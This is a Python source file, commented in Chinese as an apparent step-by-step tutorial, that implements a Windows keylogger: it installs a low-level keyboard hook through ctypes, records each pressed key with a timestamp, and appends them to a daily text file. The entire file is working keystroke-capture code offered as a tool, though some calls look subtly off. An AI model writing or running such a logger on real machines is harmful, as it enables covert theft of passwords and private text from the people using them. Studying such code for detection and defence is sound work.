# -*- coding: UTF-8 -*-
import sys
import time
from ctypes import *
from datetime import datetime
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD


user32 = windll.user32      # （1）使用windll声明user32与kernel32类型的变量
kernel32 = windll.kernel32


WH_KEYBOARD_LL = 13  # （2）变量声明
WM_KEYDOWN = 0X0100
CTRL_CODE = 162


class KeyLogger:  # （3）定义类实现挂钩，拆钩功能。
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self, pointer):  # （4）定义挂钩函数
        self.hooked = self.lUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):  # （5）定义拆钩函数
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


def getFPTR(fn):  # （6）获取函数指针
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)


def hookProc(nCode, wParam, lParam):  # （7）定义钩子过程
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(0xFFFFFFFF & lParam[0])
    current_datetime = datetime.now()
    formatted_date = current_datetime.strftime("%Y-%m-%d")
    open('{}.txt'.format(formatted_date), mode='a', encoding='utf-8').write(
        '{} {} {}\n'.format((0xFFFFFFFF & lParam[0]), hookedKey, time.ctime().split(' ')[3]))
    print((0xFFFFFFFF & lParam[0]), hookedKey, time.ctime().split(' ')[3])
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)


def startKeyLog():  # （8）传递消息
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)


keyLogger = KeyLogger()  # （9）启动消息钩取
pointer = getFPTR(hookProc)

if keyLogger.installHookProc(pointer):
    print("installed keyLogger")

startKeyLog()
